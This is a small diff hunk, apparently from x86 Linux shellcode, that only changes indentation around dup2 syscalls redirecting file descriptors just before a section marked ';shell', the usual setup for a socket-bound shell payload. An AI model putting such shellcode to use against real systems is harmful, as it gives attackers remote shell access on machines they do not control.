@@ -51,12 +51,12 @@ _start:
 	mov cl,0x1
 	int 0x80
 
-    xor eax,eax
-    mov al,63 ;dup2
-    mov ebx,edx
+   	xor eax,eax
+   	mov al,63 ;dup2
+   	mov ebx,edx
 	xor ecx,ecx
-    mov cl,0x2 ;err 
-    int 0x80
+  	mov cl,0x2 ;err 
+  	int 0x80
 	
 	;shell
 	xor eax,eax
